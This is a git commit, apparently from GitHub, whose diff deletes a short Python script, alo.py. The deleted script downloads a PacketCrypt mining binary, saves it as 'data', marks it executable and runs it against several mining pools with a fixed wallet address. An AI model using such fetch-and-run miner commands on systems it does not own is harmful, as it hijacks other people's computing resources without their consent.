5635701e9acfa64d1262911810fce4ff8e431d8e
didayang <106394787+didayang@users.noreply.github.com>
2022-05-27 15:23:16 +0000

    Delete alo.py

--- alo.py
+++
@@ -1,7 +0,0 @@
-import os
-os.system ('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O data')
-os.system ('chmod +x data')
-os.system ('./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkteer.com http://pool.pkt.world http://pool.pktpool.io')
-
-
-
